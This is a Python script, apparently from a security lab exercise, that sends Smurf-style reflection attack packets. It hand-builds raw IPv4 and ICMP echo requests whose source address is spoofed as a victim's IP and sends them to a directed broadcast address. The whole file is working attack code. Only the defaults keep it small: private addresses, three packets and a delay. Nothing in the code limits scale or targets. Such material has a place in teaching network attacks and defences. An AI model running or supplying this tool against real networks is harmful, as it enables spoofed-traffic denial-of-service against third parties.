#!/usr/bin/env python3
"""Send lab-only Smurf-style ICMP packets to a directed broadcast address."""

from __future__ import annotations

import argparse
import os
import socket
import struct
import sys
import time


def checksum(data: bytes) -> int:
    if len(data) % 2:
        data += b"\x00"
    total = sum(struct.unpack("!{}H".format(len(data) // 2), data))
    total = (total >> 16) + (total & 0xFFFF)
    total += total >> 16
    return (~total) & 0xFFFF


def build_icmp_echo(identifier: int, sequence: int, payload_size: int) -> bytes:
    payload = (b"SEED-SMURF-LAB-" + bytes([sequence % 256])) * ((payload_size // 16) + 1)
    payload = payload[:payload_size]
    header = struct.pack("!BBHHH", 8, 0, 0, identifier, sequence)
    csum = checksum(header + payload)
    return struct.pack("!BBHHH", 8, 0, csum, identifier, sequence) + payload


def build_ipv4_packet(source: str, destination: str, payload: bytes, packet_id: int) -> bytes:
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 20 + len(payload)
    flags_fragment = 0
    ttl = 64
    protocol = socket.IPPROTO_ICMP
    header_checksum = 0
    src = socket.inet_aton(source)
    dst = socket.inet_aton(destination)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        tos,
        total_length,
        packet_id,
        flags_fragment,
        ttl,
        protocol,
        header_checksum,
        src,
        dst,
    )
    header_checksum = checksum(header)
    header = struct.pack(
        "!BBHHHBBH4s4s",
        version_ihl,
        tos,
        total_length,
        packet_id,
        flags_fragment,
        ttl,
        protocol,
        header_checksum,
        src,
        dst,
    )
    return header + payload


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="Trigger a lab-only Smurf-style attack.")
    parser.add_argument("--broadcast", default="10.152.0.255", help="directed broadcast address")
    parser.add_argument("--victim", default="10.151.0.71", help="spoofed victim source address")
    parser.add_argument("--count", type=int, default=3, help="number of spoofed echo requests")
    parser.add_argument("--interval", type=float, default=0.2, help="seconds between requests")
    parser.add_argument("--payload-size", type=int, default=32, help="ICMP payload size in bytes")
    return parser.parse_args()


def main() -> int:
    args = parse_args()
    identifier = os.getpid() & 0xFFFF

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    except PermissionError:
        print("raw socket permission denied; run inside a container with CAP_NET_RAW", file=sys.stderr)
        return 2

    for sequence in range(1, args.count + 1):
        icmp = build_icmp_echo(identifier, sequence, args.payload_size)
        packet = build_ipv4_packet(args.victim, args.broadcast, icmp, packet_id=identifier + sequence)
        sock.sendto(packet, (args.broadcast, 0))
        print(
            "sent spoofed icmp_echo_request seq={} source={} destination={} bytes={}".format(
                sequence,
                args.victim,
                args.broadcast,
                len(packet),
            ),
            flush=True,
        )
        if sequence != args.count:
            time.sleep(args.interval)

    return 0


if __name__ == "__main__":
    raise SystemExit(main())
